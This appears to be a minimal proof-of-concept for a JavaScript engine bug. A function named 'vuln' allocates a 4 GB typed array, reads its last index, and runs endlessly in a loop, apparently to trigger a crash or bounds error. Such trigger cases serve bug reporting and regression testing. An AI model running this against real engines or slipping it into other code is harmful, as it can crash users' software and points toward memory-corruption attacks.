const kSize = 4294967296;  
function vuln() {  
        const v22 = new Uint8Array(kSize);  
        return v22["4294967295"];  
}  
  
while (true) {  
        vuln();  
}  